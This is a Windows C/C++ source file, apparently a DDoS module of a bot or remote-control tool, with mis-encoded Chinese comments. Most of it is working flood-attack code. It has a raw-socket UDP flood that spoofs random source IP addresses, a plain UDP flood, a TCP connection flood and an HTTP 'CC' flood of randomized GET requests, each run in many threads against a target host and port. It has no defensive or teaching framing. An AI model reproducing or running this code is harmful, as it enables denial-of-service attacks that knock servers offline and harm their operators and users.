#include <windows.h>
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>
#pragma comment(lib,"WS2_32.LIB")

#include "..\\..\\common\\macros.h"

/*===========================================����=============================================*/
CString zIP; //ת��ǰ������
CString ctsz; //����Ŀ��������׺
char tgtIP[30]="192.168.1.2";//Ҫ������Ŀ��IP
char zdyBuffer[256];//�Զ����Buffer
int tgtPort=80; //����IP
int timeout=10; //����ʱ��
int SleepTime=5;//����ʱ��
int StopFlag = 1;//�Ƿ�ֹͣ����
int z;//�����߳���
int S1=0,S2=500; //�������ʼ�����
HANDLE h[MAX_PATH];//��ʼ���߳̾��
volatile bool rnd;

//����CC��ǿ������
int countupdate;//�Ƿ���DNS�ض�λ
int datarecv; //�Ƿ��հ�����
int ccthread;//���η�����
char yfcs[256];
char cscs[256];



/*--------------------------------------IP��ⱨУ��------------------------------------------*/
typedef struct  _iphdr
{
	unsigned char   h_verlen; //4λ�ֲ����ȣ���4λIP�汾��
	unsigned char   tos; //8λ���ͷ���
	unsigned short  total_len; //16λ�ܳ��� 
	unsigned short  ident; //16λ��־
	unsigned short  frag_and_flags; //����
	unsigned char   ttl; //8λ����ʱ�� 
	unsigned char   proto; //8λЭ�� 
	unsigned short  checksum; //ip�ײ�Ч���
	unsigned int    sourceIP; //α��IP��ַ�򱾻�
	unsigned int    destIP; //������ip��ַ 
}IP_HEADER, * PIP_HEADER;

USHORT checksum(USHORT *buffer, int size)
{ 
	unsigned long cksum=0;
	while(size >1)
	{
		cksum+=*buffer++;
		size -=sizeof(USHORT);
	}
	if(size)
	{
		cksum += *(UCHAR*)buffer;
	}
	cksum = (cksum >> 16) + (cksum & 0xffff);
	cksum += (cksum >>16);
	return (USHORT)(~cksum);
}
/*--------------------------------------UDP data----------------------------------------------*/
#define nBufferSize 1024 //UDP ���ݰ���С
static char pSendBuffer[nBufferSize+60]; //���ݴ�С+��װ���ݰ�
static int  iTotalSize=0; //���ݰ�+IPͷ+UDPͷ��С��

typedef struct udp_hdr //UDP�ײ�
{
	unsigned short sourceport;  //������α��Ķ˿�
	unsigned short destport;  //������IP�˿�
	unsigned short udp_length;  //UDP��ַ����
	unsigned short udp_checksum; //UDP�ײ�У���
} UDP_HEADER;
/*--------------------------------------SYN data----------------------------------------------*/
typedef struct  _tcphdr
{
	unsigned short  th_sport; //�����˿�
	unsigned short  th_dport; //������IP�˿�
	unsigned int    th_seq; //32λ���к�
	unsigned int    th_ack; //32λȷ�Ϻ�
	unsigned char   th_lenres; //4λ�ײ�����
	unsigned char   th_flag; //6λ��־λ ACK SYN and so on
	unsigned short  th_win; //16λ���ڴ�С 
	unsigned short  th_sum; //16λЧ��� 
	unsigned short  th_urp; //16λ����ָ��
}TCP_HEADER, * PTCP_HEADER;

typedef struct tsd_hdr
{ 
	unsigned long  saddr; //������ַ��α���ַ
	unsigned long  daddr; //Ŀ���ַ
	char           mbz; 
	char           ptcl; //Э������
	unsigned short tcpl; //TCP����
}PSD_HEADER; 
/*-----------------------------ICMP data-----------------------------------------------*/
typedef struct _icmphdr				//����ICMP�ײ�
{
	BYTE   i_type;					//8λ����
	BYTE   i_code;					//8λ����
	USHORT i_cksum;					//16λУ��� 
	USHORT i_id;					//ʶ���
	USHORT i_seq;					//�������к�	
	ULONG  timestamp;				//ʱ���
}ICMP_HEADER;

/////////////CC tcp����///////////////////////////////////////////////////////////////
CString rsCS(CString str)
{
    CString NewStr,tempstr,nstr;
	CString CStr,Func;
	char fu;
	int LFunc;
	int i,x=0;
    if (rnd==false) return str;
	srand((unsigned)time( NULL ));
	NewStr=str;
	while ((x=NewStr.Find ("+",0))!=-1)
	{
		tempstr="";
		CStr="";
		nstr=NewStr.Mid (x,3);
		Func=NewStr.Mid (x+1,1);memcpy(&fu, Func, 1);
		LFunc=atoi(NewStr.Mid (x+2,1));
		switch(fu)
		{
		case 'N':
				for(i=0;i<LFunc;i++)
				{tempstr.Format ("%c",48+rand()%10);CStr+=tempstr;}
				break;
		case 'U':
				for(i=0;i<LFunc;i++)
				{tempstr.Format ("%c",65+rand()%26);CStr+=tempstr;}
				break;
		case 'L':
				for(i=0;i<LFunc;i++)
				{tempstr.Format ("%c",97+rand()%26);CStr+=tempstr;}
				break;
		case 'C':
				for(i=0;i<LFunc;i++)
				{tempstr.Format ("%%%c%c%%%c%c",65+rand()%6,48+rand()%10,65+rand()%6,48+rand()%10);CStr+=tempstr;}
				break;
		default:
			tempstr=""	;
			CStr="";
			break;
		}
		NewStr.Replace (nstr,CStr);
	}
	return NewStr;
}
/////////////////////////////////////////////////////////////////////////////////////////
DWORD resolveIP(char *hostName)
{
    hostent *hent;
    char **addresslist;
    DWORD result = 0;

    hent = gethostbyname(hostName);
    if(hent)
    {
        addresslist = hent->h_addr_list;
    
        if (*addresslist) 
        {
            result = *((DWORD *)(*addresslist));
        }
    }

    return result;
}


void wait_for_end()
{
	DWORD s_time = timeout*60*1000;
	Sleep(s_time);
	
	StopFlag=1;
}

SOCKET tcpConnect(char *host, int port) //CC����TCP���Ӻ���
{
    SOCKET sock;
	
    sock = socket(AF_INET, SOCK_STREAM, 0);
	
    if(sock == INVALID_SOCKET)
        return sock;
	
    sockaddr_in sin;
	
    DWORD ip = resolveIP(host);
    if(ip == 0)
        ip = inet_addr(host);
	
    sin.sin_addr.s_addr = ip;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);
	
	if(connect(sock, (sockaddr *)&sin, sizeof(sin)) == SOCKET_ERROR)
    {
        closesocket(sock);
        return INVALID_SOCKET;
    }
	
    return sock; 
}

/*********************************************************α��ԴUDP*******************************************************************/

void rawudpattack() 
{
	WSADATA WSAData;
	WSAStartup(MAKEWORD(2,2), &WSAData);

	SOCKET    SendSocket; 
	BOOL    Flag; 

	SendSocket = WSASocket(AF_INET,SOCK_RAW,IPPROTO_UDP,NULL,0,0);
	if( SendSocket == INVALID_SOCKET ) 
		return; 

	Flag=true;
	if (setsockopt(SendSocket,IPPROTO_IP,IP_HDRINCL,(char*)&Flag,sizeof(Flag))==SOCKET_ERROR)
	{
		printf("setsockopt Error!\n");
		return;
	}

	SOCKADDR_IN addr_in;
	addr_in.sin_family=AF_INET;
	addr_in.sin_port=htons(tgtPort);
	addr_in.sin_addr.s_addr=inet_addr(tgtIP);
	if (addr_in.sin_addr.s_addr == INADDR_NONE)
	{   
		struct hostent *hp = NULL;
		if ((hp = gethostbyname(tgtIP)) != NULL)
		 {
		 	memcpy(&(addr_in.sin_addr), hp->h_addr, hp->h_length);
		 	addr_in.sin_family = hp->h_addrtype;
		}
		else
			return;
	}

	for (;;)
	{
		if (StopFlag == 1)
		{
			ExitThread(0);
			return;
		}
		for(int i=0;i<12;i++)
			sendto(SendSocket, pSendBuffer, iTotalSize, 0, (SOCKADDR *)&addr_in, sizeof(addr_in));
		Sleep(SleepTime);
	}
	closesocket(SendSocket);
	WSACleanup();
	return; 
}

void fill_wzudp_buffer()
{
    int i;

    srand((unsigned)time( NULL ));


    i=rand()%512;


	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	char         saddr[20] = {0};
	memset(saddr,0,20);

	char pBuffer[nBufferSize];

	IP_HEADER ipHeader;
	UDP_HEADER udpHeader;

	int iUdpCheckSumSize;
	char *ptr=NULL;
	FillMemory(pBuffer, nBufferSize,i);

	iTotalSize=sizeof(ipHeader) + sizeof(udpHeader)+ nBufferSize;
	wsprintf( saddr, "%d.%d.%d.%d", rand() % 250 + 1, rand() % 250 + 1, rand() % 250 + 1, rand() % 250 + 1 ); 
	ipHeader.h_verlen = (4 << 4) | (sizeof(ipHeader) / sizeof(unsigned long));
	ipHeader.tos=0;
	ipHeader.total_len=htons(iTotalSize);
	ipHeader.ident=0;
	ipHeader.frag_and_flags=0;
	ipHeader.ttl=128;
	ipHeader.proto=IPPROTO_UDP;
	ipHeader.checksum=0;
	ipHeader.destIP=inet_addr(tgtIP);

	udpHeader.sourceport = htons( rand()%60000 + 1 );
	udpHeader.destport = htons(tgtPort);
	udpHeader.udp_length = htons(sizeof(udpHeader) + nBufferSize);
	udpHeader.udp_checksum = 0;

	ptr = NULL;
	ipHeader.sourceIP = inet_addr(saddr);

	ZeroMemory(pSendBuffer, nBufferSize + 60);
	ptr = pSendBuffer;
	iUdpCheckSumSize=0;
	udpHeader.udp_checksum = 0;

	memcpy(ptr, &ipHeader.sourceIP, sizeof(ipHeader.sourceIP));
	ptr += sizeof(ipHeader.sourceIP);
	iUdpCheckSumSize += sizeof(ipHeader.sourceIP);
	
	memcpy(ptr, &ipHeader.destIP, sizeof(ipHeader.destIP));
	ptr += sizeof(ipHeader.destIP);
	iUdpCheckSumSize += sizeof(ipHeader.destIP);
	
	ptr++;
	iUdpCheckSumSize++;
	
	memcpy(ptr, &ipHeader.proto, sizeof(ipHeader.proto));
	ptr += sizeof(ipHeader.proto);
	iUdpCheckSumSize += sizeof(ipHeader.proto);
	
	memcpy(ptr, &udpHeader.udp_length, sizeof(udpHeader.udp_length));
	ptr += sizeof(udpHeader.udp_length);
	iUdpCheckSumSize += sizeof(udpHeader.udp_length);
	
	memcpy(ptr, &udpHeader, sizeof(udpHeader));
	ptr += sizeof(udpHeader);
	iUdpCheckSumSize += sizeof(udpHeader);
	
	memcpy(ptr, pBuffer, nBufferSize);
	iUdpCheckSumSize += nBufferSize;
	
	udpHeader.udp_checksum=checksum((USHORT*)pSendBuffer,iUdpCheckSumSize);
	memcpy(pSendBuffer, &ipHeader, sizeof(ipHeader));
	memcpy(pSendBuffer + sizeof(ipHeader), &udpHeader, sizeof(udpHeader));
	memcpy(pSendBuffer + sizeof(ipHeader) + sizeof(udpHeader), pBuffer, nBufferSize);
}

void StartWZUDP(char ip[30],int port,int mytime,int xc)
{
	
	if (inet_addr(ip)== INADDR_NONE)
	{
		struct hostent *hp = NULL;
		if ((hp = gethostbyname(ip)) != NULL)
		{
			in_addr in;
			memcpy(&in, hp->h_addr, hp->h_length);
			strcpy(tgtIP,inet_ntoa(in));
		}
	}
	else
		strcpy(tgtIP,ip);
	
	
	tgtPort=port;
	timeout=mytime;
	
	StopFlag = -1;
	fill_wzudp_buffer();
	
	for(z=0;z<xc;z++)
	{
		h[z]=CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)rawudpattack, NULL, 0, NULL);
	}
	if(timeout!=0)
	{
		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)wait_for_end, NULL, 0, NULL);
	}
}

/*********************************************************α��ԴUDP����*******************************************************************/

/*********************************************************UDP��Ƭ*******************************************************************/


void udpsattack()
{
	char senddata[5]="bfyl";
	
	int sendsize=strlen(senddata);
	
	SOCKADDR_IN udpaddr;

	udpaddr.sin_family=AF_INET;
    udpaddr.sin_addr.s_addr=inet_addr(tgtIP);
    udpaddr.sin_port=htons(tgtPort);

	SOCKET s=socket(AF_INET,SOCK_DGRAM,0);

	int nZero = 0;
	setsockopt(s,SOL_SOCKET,SO_SNDBUF,(char *)&nZero,sizeof(nZero));

	for (;;)
	{
		if(StopFlag==1)
		{
			ExitThread(0);
			return;
		}
		for(int i=0;i<5;i++)
			sendto(s,senddata,sendsize,0,(SOCKADDR *)&udpaddr,sizeof(udpaddr));
		Sleep(SleepTime);
	}
	closesocket(s);
	WSACleanup();
}

void StartUDPS(char ip[30],int port,int mytime,int xc)
{

		if (inet_addr(ip)== INADDR_NONE)
		{
			struct hostent *hp = NULL;
			if ((hp = gethostbyname(ip)) != NULL)
			{
				in_addr in;
				memcpy(&in, hp->h_addr, hp->h_length);
				strcpy(tgtIP,inet_ntoa(in));
			}
		}
		else
			strcpy(tgtIP,ip);


		tgtPort=port;
		timeout=mytime;
		StopFlag = -1;

		for(z=0;z<xc;z++)
		{
			h[z]=CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)udpsattack, NULL, 0, NULL);
		}
		if(timeout != 0)
		{
			CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)wait_for_end, NULL, 0, NULL);
		}
}


/*********************************************************UDP��Ƭ����*******************************************************************/


/*********************************************************TCP�����ӹ���*******************************************************************/

void xpattack()
{
	WSADATA               WSAData;
	WSAStartup(MAKEWORD(2,2) ,&WSAData);
	SOCKADDR_IN sockAddr;
	SOCKET	m_hSocket;
	
	int nSize = 256;
	
	memset(&sockAddr,0,sizeof(sockAddr));
	sockAddr.sin_family = AF_INET;
	sockAddr.sin_port=htons(tgtPort);
	sockAddr.sin_addr.s_addr = inet_addr(tgtIP);
	
	while(1)
	{
		if (StopFlag == 1)
		{
			ExitThread(1);
			return;
		}
		
		m_hSocket = socket(PF_INET,SOCK_STREAM,0);
		
		for(int ss=0;ss<1024;ss++)
		{
			if (connect(m_hSocket,(SOCKADDR*)&sockAddr, sizeof(sockAddr)) != 0)
			continue;
			closesocket(m_hSocket);
		}
		Sleep(SleepTime);
	}
	WSACleanup();
	return;
}
 

void StartXP(char ip[30],int port,int mytime,int xc)
{
	
	if (inet_addr(ip)== INADDR_NONE)
	{
		struct hostent *hp = NULL;
		if ((hp = gethostbyname(ip)) != NULL)
		{
			in_addr in;
			memcpy(&in, hp->h_addr, hp->h_length);
			strcpy(tgtIP,inet_ntoa(in));
		}
	}
	else
		strcpy(tgtIP,ip);
	
	
	port=tgtPort;
	timeout=mytime;
	if (StopFlag == -1)
		return;
	
	StopFlag=-1;
	
	for(z=0;z<xc;z++)
	{
		h[z]=CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)xpattack, NULL, 0, NULL);
	}
	if(SleepTime!=0)
	{
		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)wait_for_end, NULL, 0, NULL);
	}
}

/*********************************************************TCP�����ӹ�������*******************************************************************/


/*********************************************************��ѯCC����*******************************************************************/


void sjlwattack()
{
	CString url,http,rhost;
	http = zIP;
    rhost = http;
	int sjint=S1;
	while (1)
	{
		char sjsz[256];
		CString Cjsz;
		if(sjint>S2)
		{
			sjint=0;
		}
                 sjint+=1;
		Cjsz.Format(ctsz,sjint);
		strcpy(sjsz,Cjsz);
		url="GET "+rsCS(sjsz)+" HTTP/1.1\r\n"             
			+"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/msword, */*\r\n"
			+"Accept-Language: zh-cn\r\n"
			+"Accept-Encoding: deflate"
			+"\r\nUser-Agent:Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
			+"\r\nHost:"+rhost
			+"\r\nConnection: Keep-Alive"
			+"\r\n\r\n";
		memset(sjsz,0,256);
		if (StopFlag == 1)
		{
			ExitThread(0);
			return;
		}
		SOCKET S=tcpConnect(tgtIP,tgtPort);
		send(S,url,url.GetLength() ,0);
		closesocket(S);
		Sleep(SleepTime);
	}
}


DWORD WINAPI StartSJLW(LPVOID lp)
{
	LPDDOSST para = (LPDDOSST)lp;
	
	char *ip = para->addr;
	
	int port = para->port;
	
	int time = para->time;
	
	int xc = para->thread;
	
	CString tIP=ip;
	tIP.Delete(0,7);
	zIP=tIP.Left(tIP.Find("/"));
	
	tIP.Delete(0,tIP.Find("/"));
	ctsz=tIP;
	
	S1 = GetTickCount();
	S2 = GetTickCount() + 15;
	
	if (inet_addr(zIP)== INADDR_NONE)
	{
		struct hostent *hp = NULL;
		if ((hp = gethostbyname(zIP)) != NULL)
		{
			in_addr in;
			memcpy(&in, hp->h_addr, hp->h_length);
			strcpy(tgtIP,inet_ntoa(in));
		}
	}
	else
		strcpy(tgtIP,zIP);
	
	tgtPort=port;
	timeout=time;
	StopFlag = -1;
	for(z=0;z<xc;z++)
	{
		h[z]=CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)sjlwattack, NULL, 0, NULL);
	}
	if(timeout!=0)
	{
		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)wait_for_end, NULL, 0, NULL);
	}
}

/*********************************************************��ѯCC��������*******************************************************************/

